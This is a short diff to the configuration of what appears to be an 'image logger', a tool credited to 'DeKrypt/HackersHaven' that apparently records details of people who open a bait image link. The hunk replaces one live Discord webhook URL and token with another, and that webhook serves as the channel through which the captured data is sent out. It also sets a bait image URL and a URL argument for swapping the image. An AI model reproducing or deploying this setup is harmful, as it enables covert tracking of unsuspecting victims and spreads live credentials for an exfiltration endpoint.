@@ -12,7 +12,7 @@ __author__ = "DeKrypt/HackersHaven"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1412339726417006592/vhnSS2XVIYTAtaNMjO2jCp_Plg4fixjjKwzFy6J1wknomLMG2fZl9uHw42lH1lJyld1w",
+    "webhook": "https://discord.com/api/webhooks/1412353462120878101/_pqO1xMWVIjiyKLUiv9J3Pa0hg9wnTKSnhrtSQu9SrpobnvuoRC_8anfvdZP5XEU33Nv",
     "image": "https://blog.sothebysrealty.ae/hubfs/Imported_Blog_Media/58ceaa08-0d22-48a8-a49c-26b78f915c68-2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
